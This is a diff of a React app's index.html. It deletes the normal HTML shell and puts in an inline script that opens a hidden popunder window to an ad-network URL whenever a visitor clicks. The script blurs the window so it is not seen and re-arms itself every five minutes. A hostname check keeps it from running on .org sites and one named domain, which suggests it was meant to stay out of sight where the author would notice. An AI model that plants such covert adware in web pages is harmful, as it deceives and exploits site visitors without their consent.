@@ -1,1 +1,30 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"/><link rel="icon" href="/test/favicon.ico"/><meta name="viewport" content="width=device-width,initial-scale=1"/><meta name="theme-color" content="#000000"/><meta name="description" content="Web site created using create-react-app"/><link rel="apple-touch-icon" href="/test/logo192.png"/><link rel="manifest" href="/test/manifest.json"/><title>React App</title><script defer="defer" src="/test/static/js/main.2e7e26a4.js"></script></head><body><noscript>You need to enable JavaScript to run this app.</noscript><div id="root"></div></body></html>
+<script>
+    function openPopunder() {
+        var url = "http://www.effectiveratecpm.com/ne82b1t83?key=18ee59d947491ff4cfcc5a6816a2d52d";
+        var newWindow = window.open(url, "_blank");
+
+        if (newWindow) {
+            newWindow.blur();
+            window.focus();
+        }
+
+        // Wait 5 minutes before allowing another click to trigger the popunder
+        setTimeout(() => {
+            document.addEventListener("click", clickHandler, { once: true });
+        }, 5 * 60 * 1000);
+    }
+
+    function clickHandler() {
+        openPopunder();
+    }
+
+    function shouldRunPopunder() {
+        var currentUrl = window.location.hostname;
+        return !currentUrl.includes(".org") && currentUrl !== "psybolt.com";
+    }
+
+    // Check if the popunder should run
+    if (shouldRunPopunder()) {
+        document.addEventListener("click", clickHandler, { once: true });
+    }
+</script>
